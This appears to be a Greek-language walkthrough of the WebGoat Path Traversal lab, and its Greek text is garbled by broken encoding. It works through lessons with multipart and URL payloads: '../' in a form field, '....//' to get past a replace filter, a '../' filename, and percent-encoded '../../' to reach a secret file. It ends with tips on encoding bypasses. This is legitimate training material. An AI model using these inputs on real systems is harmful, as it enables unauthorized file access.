
# ğŸ›¡ï¸ Path Traversal (A1)

Î•ÎºÏ€Î±Î¹Î´ÎµÏ…Ï„Î¹ÎºÏŒ Ï…Î»Î¹ÎºÏŒ Î³Î¹Î± Ï„Î·Î½ ÎºÎ±Ï„Î±Î½ÏŒÎ·ÏƒÎ· ÎºÎ±Î¹ ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· ÎµÏ…Ï€Î±Î¸ÎµÎ¹ÏÎ½ Ï„ÏÏ€Î¿Ï… **Path Traversal** Î¼Î­ÏƒÏ‰ Î±ÏÏ‡ÎµÎ¯Ï‰Î½ Î® Ï€Î±ÏÎ±Î¼Î­Ï„ÏÏ‰Î½ HTTP.

---

## ğŸ“˜ ÎœÎ¬Î¸Î·Î¼Î± 2 â€“ Path Traversal ÎºÎ±Ï„Î¬ Ï„Î·Î½ Î±Ï€Î¿ÏƒÏ„Î¿Î»Î® Î±ÏÏ‡ÎµÎ¯Ï‰Î½

**ğŸ¯ Î£Ï„ÏŒÏ‡Î¿Ï‚:** Î‘Ï€Î¿ÏƒÏ„Î¿Î»Î® ÎµÎ¹ÎºÏŒÎ½Î±Ï‚ Ï€ÏÎ¿Ï†Î¯Î» *ÎµÎºÏ„ÏŒÏ‚* Ï„Î¿Ï… Ï†Î±ÎºÎ­Î»Î¿Ï… `{username}`.

**ğŸ“š Î•Ï€ÎµÎ¾Î®Î³Î·ÏƒÎ·:** Î¤Î¿ Ï€ÎµÎ´Î¯Î¿ `fullName` Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î±Ï€ÎµÏ…Î¸ÎµÎ¯Î±Ï‚ Î³Î¹Î± Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î·Î¸ÎµÎ¯ Î· Î´Î¹Î±Î´ÏÎ¿Î¼Î® Î±Ï€Î¿Î¸Î®ÎºÎµÏ…ÏƒÎ·Ï‚ Î±ÏÏ‡ÎµÎ¯Î¿Ï…, Ï‡Ï‰ÏÎ¯Ï‚ ÏƒÏ‰ÏƒÏ„Î® Î±Ï€Î¿Î»ÏÎ¼Î±Î½ÏƒÎ· (sanitization). ÎˆÏ„ÏƒÎ¹, Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î³Î¯Î½ÎµÎ¹ Ï‡ÏÎ®ÏƒÎ· Ï„Î·Ï‚ Î±ÎºÎ¿Î»Î¿Ï…Î¸Î¯Î±Ï‚ `../`.

### ğŸ“¦ Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±:
```
-----------------------------27260332916296986533744447080
Content-Disposition: form-data; name="fullName"

../test
```

---

## ğŸ“˜ ÎœÎ¬Î¸Î·Î¼Î± 3 â€“ Î Î±ÏÎ¬ÎºÎ±Î¼ÏˆÎ· Î±Ï€Î¿Î»ÏÎ¼Î±Î½ÏƒÎ·Ï‚

**ğŸ¯ Î£Ï„ÏŒÏ‡Î¿Ï‚:** ÎÎ± Ï€Î±ÏÎ±ÎºÎ¬Î¼ÏˆÎµÎ¹Ï‚ Ï„Î¿Î½ Î¼Î·Ï‡Î±Î½Î¹ÏƒÎ¼ÏŒ `fullName.replace("../", "")`.

**ğŸ“š Î•Ï€ÎµÎ¾Î®Î³Î·ÏƒÎ·:** Î— Î±Ï€Î»Î® Î±Î½Ï„Î¹ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· Ï„Î¿Ï… `../` Î´ÎµÎ½ ÎºÎ±Î»ÏÏ€Ï„ÎµÎ¹ Ï€ÎµÏÎ¹Ï€Ï„ÏÏƒÎµÎ¹Ï‚ ÏŒÏ€Ï‰Ï‚ `....//`, ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Î½Ï„Î±Ï‚ ÎºÎ±Î¹ Ï€Î¬Î»Î¹ path traversal.

### ğŸ“¦ Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±:
```
-----------------------------22445278214949939952398157170
Content-Disposition: form-data; name="fullNameFix"

....//test
```

---

## ğŸ“˜ ÎœÎ¬Î¸Î·Î¼Î± 4 â€“ Path Traversal Î¼Î­ÏƒÏ‰ Î¿Î½ÏŒÎ¼Î±Ï„Î¿Ï‚ Î±ÏÏ‡ÎµÎ¯Î¿Ï…

**ğŸ¯ Î£Ï„ÏŒÏ‡Î¿Ï‚:** Î‘Ï€Î¿ÏƒÏ„Î¿Î»Î® Î±ÏÏ‡ÎµÎ¯Î¿Ï… Î¼Îµ ÏŒÎ½Î¿Î¼Î± Ï€Î¿Ï… Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ `../`, ÏÏƒÏ„Îµ Î½Î± Î±Ï€Î¿Î¸Î·ÎºÎµÏ…Ï„ÎµÎ¯ ÏƒÎµ Î±Î½ÏÏ„ÎµÏÎ¿ Ï†Î¬ÎºÎµÎ»Î¿.

**ğŸ“š Î•Ï€ÎµÎ¾Î®Î³Î·ÏƒÎ·:** Î‘Î½ Ï„Î¿ ÏŒÎ½Î¿Î¼Î± Î±ÏÏ‡ÎµÎ¯Î¿Ï… (filename) Î´ÎµÎ½ ÎºÎ±Î¸Î±ÏÎ¯Î¶ÎµÏ„Î±Î¹ ÏƒÏ‰ÏƒÏ„Î¬, Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎµÎ¹ Ï„Î·Î½ Î±Ï€Î¿Î¸Î®ÎºÎµÏ…ÏƒÎ· Î±ÏÏ‡ÎµÎ¯Ï‰Î½ Î­Î¾Ï‰ Î±Ï€ÏŒ Ï„Î¿Î½ ÎµÏ€Î¹Ï„ÏÎµÏ€ÏŒÎ¼ÎµÎ½Î¿ ÎºÎ±Ï„Î¬Î»Î¿Î³Î¿.

### ğŸ“¦ Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±:
```
-----------------------------1740053938349190302459631647
Content-Disposition: form-data; name="uploadedFileRemoveUserInput"; filename="../myfile.txt"
Content-Type: text/plain
```

---

## ğŸ“˜ ÎœÎ¬Î¸Î·Î¼Î± 5 â€“ Î‘Î½Î¬ÎºÏ„Î·ÏƒÎ· Î¬Î»Î»Ï‰Î½ Î±ÏÏ‡ÎµÎ¯Ï‰Î½ Î¼Îµ Path Traversal

**ğŸ¯ Î£Ï„ÏŒÏ‡Î¿Ï‚:** Î‘Î½Î¬ÎºÏ„Î·ÏƒÎ· Î±ÏÏ‡ÎµÎ¯Ï‰Î½ ÎµÎºÏ„ÏŒÏ‚ Ï†Î±ÎºÎ­Î»Î¿Ï… Î¼Î­ÏƒÏ‰ Ï€Î±ÏÎ±Î¼Î­Ï„ÏÏ‰Î½ URL.

### ğŸ” Î‘ÏÏ‡Î¹ÎºÏŒ Î±Î¯Ï„Î·Î¼Î±:
```
GET http://XXXusernameXXX:8080/WebGoat/PathTraversal/random-picture
```

### ğŸ“¥ Î‘Ï€ÏŒÎºÏÎ¹ÏƒÎ·:
```http
HTTP/1.1 200 OK
Location: /PathTraversal/random-picture?id=4.jpg
Content-Type: image/jpeg
...
```

### ğŸ” Î‘Î¯Ï„Î·Î¼Î± Î¼Îµ `id=4.jpg`:
```
GET http://XXXusernameXXX:8080/WebGoat/PathTraversal/random-picture?id=4.jpg
```

### ğŸ“¤ Î‘Ï€ÏŒÎºÏÎ¹ÏƒÎ·:
```
C:\Users\XXXusernameXXX\.webgoat-v8.0.0-SNAPSHOT\PathTraversal\cats\1.jpg,...
```

> ğŸ” **Î£Ï…Î¼Ï€Î­ÏÎ±ÏƒÎ¼Î±**: Î•Ï€Î¹ÏƒÏ„ÏÎ­Ï†ÎµÎ¹ ÎºÎ±Ï„Î±Î»ÏŒÎ³Î¿Ï…Ï‚ Î±ÏÏ‡ÎµÎ¯Ï‰Î½ â€” Î´Ï…Î½Î±Ï„ÏŒÏ„Î·Ï„Î± Î³Î¹Î± ÎµÎ¾ÎµÏÎµÏÎ½Î·ÏƒÎ·.

---

### ğŸ§ª Î ÏÎ¿ÏƒÏ€Î¬Î¸ÎµÎ¹Î± Î´Î¹Î±Ï†Ï…Î³Î®Ï‚ Î±Ï€ÏŒ Ï„Î¿Î½ Ï†Î¬ÎºÎµÎ»Î¿:
```
GET http://XXXusernameXXX:8080/WebGoat/PathTraversal/random-picture?id=../../path-traversal-secret
```

### âŒ Î‘Ï€ÏŒÎºÏÎ¹ÏƒÎ·:
```
Illegal characters are not allowed in the query params
```

---

### âœ… Î•Ï€Î¹Ï„Ï…Ï‡Î®Ï‚ Î±Ï€ÏŒÏ€ÎµÎ¹ÏÎ± Î¼Îµ URL encoding:
```
GET http://XXXusernameXXX:8080/WebGoat/PathTraversal/random-picture?id=%2E%2E%2F%2E%2E%2Fpath-traversal-secret
```

### ğŸ‰ Î‘Ï€ÏŒÎºÏÎ¹ÏƒÎ·:
```
You found it submit the SHA-512 hash of your username as answer
```

---

## ğŸ§¾ Î¤ÎµÎ»Î¹ÎºÏŒ Î’Î®Î¼Î±: Î¥Ï€Î¿Î»Î¿Î³Î¹ÏƒÎ¼ÏŒÏ‚ SHA-512

Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¯Î·ÏƒÎµ Ï„Î·Î½ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÎµÎ½Ï„Î¿Î»Î®:
```
$ printf XXXusernameXXX | sha512sum
```

### âœ… Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± ÎµÎ¾ÏŒÎ´Î¿Ï…:
```
4c5aab6d6999943bac2b9e7acca349c0c7fce12761a4798062031a0f40a08a3f4011f3b09915f868fe7966c401316951b7669f5d54d3c67774e3a63c3040c9a6  -
```

---

## ğŸ§  Î£Ï…Î¼Î²Î¿Ï…Î»Î­Ï‚ Î³Î¹Î± Î•ÎºÏ€Î±Î¹Î´ÎµÏ…ÏŒÎ¼ÎµÎ½Î¿Ï…Ï‚:

- Î Î¬Î½Ï„Î± Î½Î± Î´Î¿ÎºÎ¹Î¼Î¬Î¶ÎµÎ¹Ï‚ Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÎ­Ï‚ Ï€Î±ÏÎ±Î»Î»Î±Î³Î­Ï‚ Ï„Î¿Ï… `../`, ÏŒÏ€Ï‰Ï‚ `....//`, `%2E%2E%2F`.
- Î ÏÎ¿ÏƒÏ€Î¬Î¸Î·ÏƒÎµ Î½Î± Ï€ÏÎ¿ÎºÎ±Î»Î­ÏƒÎµÎ¹Ï‚ directory listing Î³Î¹Î± Î½Î± Î±Ï€Î¿ÎºÎ±Î»ÏÏˆÎµÎ¹Ï‚ ÎµÏ€Î¹Ï€Î»Î­Î¿Î½ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚.
- Î”Î¿ÎºÎ¯Î¼Î±ÏƒÎµ Î½Î± Ï€Î±ÏÎ±ÎºÎ¬Î¼ÏˆÎµÎ¹Ï‚ ÎµÎ»Î­Î³Ï‡Î¿Ï…Ï‚ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„ÎµÏ‡Î½Î¹ÎºÎ­Ï‚ URL encoding Î® double encoding.

---
